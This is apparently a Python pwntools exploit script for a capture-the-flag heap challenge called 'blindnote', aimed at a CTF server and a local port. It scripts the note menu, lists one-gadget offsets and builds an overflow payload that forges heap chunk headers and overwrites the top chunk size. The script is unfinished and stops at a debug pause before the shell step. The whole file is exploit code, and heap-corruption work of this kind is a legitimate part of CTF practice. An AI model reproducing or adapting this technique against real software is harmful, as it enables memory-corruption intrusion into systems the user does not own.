#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./blindnote"

rhp1 = {'host':"blindnote.ctf.jyoken.net",'port':80}
rhp2 = {'host':"localhost",'port':12301}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

def hoge(conn,n):
  conn.recvuntil("> ")
  conn.sendline(str(n))

def _create(conn,content):
  hoge(conn,1)
  conn.recvuntil("Contents: ")
  conn.sendline(content)

def _show(conn,ix):
  hoge(conn,2)
  conn.recvuntil("Index: ")
  conn.sendline(str(ix))

def _delete(conn,ix):
  hoge(conn,3)
  conn.recvuntil("Index: ")
  conn.sendline(str(ix))

onegadgets = [0x4f2c5,0x4f322,0x10a38c]

def exploit(conn):
  _create(conn,"A"*0x90)
  _create(conn,"B"*0x90)
  
  _delete(conn,0)
  payload = "A"*0x90
  temp = p64(0)+p64(0x501)+"B"*0x90
  temp += p64(0)+p64(0x10c71) #top
  temp += p8(0)*(0x500-len(temp))
  temp += p64(0x500) + p64(0x21) #next fakce chunk
  payload += temp
  _create(conn,payload)

  raw_input()
  _delete(conn,1)




if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

